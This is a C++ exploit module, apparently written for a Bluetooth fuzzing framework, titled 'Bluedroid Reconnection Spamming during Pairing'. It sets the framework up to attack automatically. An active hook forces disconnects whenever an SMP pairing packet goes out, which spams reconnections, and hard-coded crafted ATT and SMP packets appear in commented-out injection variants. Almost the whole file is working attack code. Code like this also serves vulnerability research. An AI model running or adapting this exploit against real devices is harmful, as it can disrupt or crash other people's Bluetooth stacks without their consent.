#include "ModulesInclude.hpp"
#include "configs/BTHostConfig.hpp"

// Filters

// Vars

// Setup
const char *module_name()
{
    return "Bluedroid Reconnection Spamming during Pairing";
}

int setup(void *p)
{
    // Change required configuration for exploit
    Config *config = (Config *)p;
    config->options.auto_start = true;
    config->fuzzing.enable_duplication = false;
    config->fuzzing.enable_mutation = false;
    config->fuzzing.enable_optimization = false;
    config->fuzzing.packet_retry = true;
    config->fuzzing.packet_retry_timeout_ms = 500;
    config->bluetooth.randomize_own_bt_address = false;

    return 0;
}

static uint8_t d_pkt_buf[200];
static uint16_t d_pkt_len = 0;

static uint8_t packet[] = {0x2, 0x0, 0x0, 0x7, 0x0, 0x3, 0x0, 0x4, 0x0,
                           0x2, 0x9b, 0x6};

// TX
// int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
// {
//     if (packet_has_condition("btatt.opcode == 0x02")) {
//         d_pkt_len = pkt_length;
//         memcpy(d_pkt_buf, pkt_buf, pkt_length);
//         send_packet(p, d_pkt_buf, d_pkt_len, 100);
//     }
//     return 0;
// }

// RX

// int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
// {
//     if (packet_has_condition("btsmp.opcode == 0x06")) {
//         m_disconnect(p);
//     }
//     return 0;
// }

// int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
// {
//     if (packet_has_condition("bthci_evt.opcode.ocf == 0x00d")) {
//         send_packet(p, packet, sizeof(packet), 3);
//     }
//     return 0;
// }

static uint8_t packet1[] = {0x2, 0x0, 0x0, 0x9, 0x0, 0x5, 0x0, 0x4, 0x0,
                            0x4, 0xb, 0x0, 0xb, 0x0};

uint8_t packetsmp[] = {0x2, 0x0, 0x0, 0x15, 0x0, 0x11, 0x0, 0x6, 0x0,
                       0x4, 0xa1, 0x93, 0x86, 0xe2, 0x96, 0x8b, 0x8e,
                       0x57, 0x59, 0x72, 0xfa, 0xa4, 0x1d, 0x7, 0x58,
                       0xf5};

int tx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // if (packet_has_condition("(btatt.uuid16 == 0x2800) && "
    //                          "(btatt.starting_handle == 0x0033) && (btatt.ending_handle == 0xffff)")) {

    //     send_packet(p, packet1, sizeof(packet1), 1);
    // }
    // else if (packet_has_condition("(btatt.uuid16 == 0x2802) && "
    //                               "(btatt.starting_handle == 0x0001) && (btatt.ending_handle == 0xffff)")) {
    //     packet[9] = 0x03;
    //     return 1;
    // }

    if (packet_has_condition("btsmp.opcode == 0x03")) {
        // pkt_buf[10] = 0x50;
        // send_packet(p, packetsmp, sizeof(packetsmp), 2);
        m_disconnect(p);
        return 1;
    }

    return 0;
}

static uint8_t packet3[] = {0x2, 0x0, 0x0, 0xb, 0x0, 0x7, 0x0, 0x4, 0x0,
                            0x8, 0x1, 0x0, 0x7, 0x0, 0x3, 0x28};

static uint8_t packet4[] = {0x2, 0x0, 0x0, 0xb, 0x0, 0x7, 0x0, 0x4, 0x0,
                            0x8, 0x8, 0x0, 0xb, 0x0, 0x3, 0x28};

static uint8_t packet5[] = {0x2, 0x0, 0x0, 0xe, 0x0, 0xa, 0x0, 0x4, 0x0,
                            0x12, 0xe, 0x0, 0x2, 0x8a, 0x24, 0x66, 0x82,
                            0x1, 0x0};

static uint8_t packet6[] = {0x2, 0x0, 0x0, 0x15, 0x0, 0x11, 0x0, 0x6, 0x0,
                            0x6, 0xc8, 0xe6, 0x1c, 0xad, 0x35, 0xca, 0xd3,
                            0x1d, 0xa9, 0x83, 0xbd, 0x71, 0xc7, 0x49, 0x2b,
                            0xac, 0x2, 0x0, 0x0, 0xf, 0x0, 0xb, 0x0,
                            0x6, 0x0, 0x7, 0xc4, 0xea, 0xef, 0xf0, 0xf6,
                            0xca, 0xe7, 0xcf, 0x62, 0xfb};

static uint8_t flag1 = 0;

int rx_post_dissection(uint8_t *pkt_buf, int pkt_length, void *p)
{
    // if (packet_has_condition("bthci_evt.opcode == 0x200d")) {
    //     send_packet(p, packet5, sizeof(packet5));
    // }
    // else if (!flag1 && packet_has_condition("bthci_evt.code == 0x13")) {
    //     flag1 = 1;
    //     send_packet(p, packet6, sizeof(packet6), 12);
    // }
    // else if (packet_has_condition("btsmp.opcode == 0x06")) {
    //     send_packet(p, packet3, sizeof(packet3), 1);
    //     // m_disconnect(p);
    // }

    // else if (packet_has_condition("bthci_evt.code == 0x05")) {
    //     flag1 = 0;
    //     send_packet(p, packet4, sizeof(packet4), 1);
    //     return 1;
    // }

    return 0;
}